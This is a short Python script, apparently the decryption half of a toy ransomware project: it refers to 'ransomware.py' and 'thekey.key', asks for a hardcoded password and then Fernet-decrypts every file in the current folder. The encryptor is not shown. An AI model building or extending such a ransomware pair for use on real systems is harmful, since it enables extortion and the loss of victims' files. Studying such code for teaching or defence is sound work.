#!/usr/bin/env python3

# Import important module
import os
from cryptography.fernet import Fernet

# Collect files to decrypt
files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print("Files to decrypt:", files)

# Load the encryption key
try:
    with open("thekey.key", "rb") as keyfile:
        secretkey = keyfile.read()
except FileNotFoundError:
    print("Encryption key file not found.")
    exit(1)

# Decryption password check
original_password = "SecureP@ssw0rd123!"
user_password = input("Enter the password to decrypt your files: ")

if user_password == original_password:
    fernet = Fernet(secretkey)
    for file in files:
        try:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            content_decrypted = fernet.decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(content_decrypted)
            print(f"File decrypted: {file}")
        except Exception as e:
            print(f"Error decrypting file {file}: {e}")
else:
    print("Incorrect password. Decryption aborted.")
